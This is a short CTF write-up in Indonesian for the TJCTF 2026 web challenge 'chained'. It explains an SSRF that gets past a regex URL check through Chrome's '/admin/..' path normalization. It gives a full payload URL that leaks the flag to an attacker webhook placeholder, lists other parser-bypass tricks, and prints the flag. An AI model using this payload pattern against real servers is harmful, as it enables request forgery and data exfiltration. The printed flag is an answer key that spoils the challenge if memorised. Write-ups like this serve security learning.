---
ctf: "TJCTF 2026 (Thomas Jefferson CTF)"
kategori: "Web"
challenge: "chained"
flag: "tjctf{ch41n3d_o340e934l35d}"
teknik: "Celah normalisasi URL WHATWG (Chrome) vs regex string literal di server → SSRF admin-bot"
---

# chained — TJCTF 2026 (Web)

## Deskripsi Singkat

Admin-bot Flask dengan SSRF di mana request digerbangi regex yang mencocokkan string URL **literal** terhadap `^https://chained\.tjc\.tf/admin/`.

## Analisis & Eksploitasi

Bot-nya menjalankan Chrome dengan parsing URL WHATWG, yang menormalisasi `/admin/..` → `/` **sebelum** melakukan fetch. Submit `https://chained.tjc.tf/admin/..?url=http://WEBHOOK_KAMU/?leak=` — regex-nya lolos pengecekan string-literal, lalu Chrome menulis-ulang request menjadi `GET /?url=http://WEBHOOK_KAMU/?leak=tjctf{…}`. Endpoint `/` milik Flask mengambil parameter `url`, melakukan `requests.get()`, dan flag (yang otomatis ditambahkan bot) sekarang jadi query parameter di webhook-mu.

> **Pelajaran:** kapan pun server memvalidasi URL sebagai **string** dan komponen di hilir **mem-parsing**-nya, kamu mendapat celah normalisasi. `/admin/..` cuma salah satu contoh — yang lain termasuk `\\\\` vs `//`, case-folding Unicode, encoding IDNA, dan pembajakan authority lewat sintaks `@`.

## Flag

```
tjctf{ch41n3d_o340e934l35d}
```
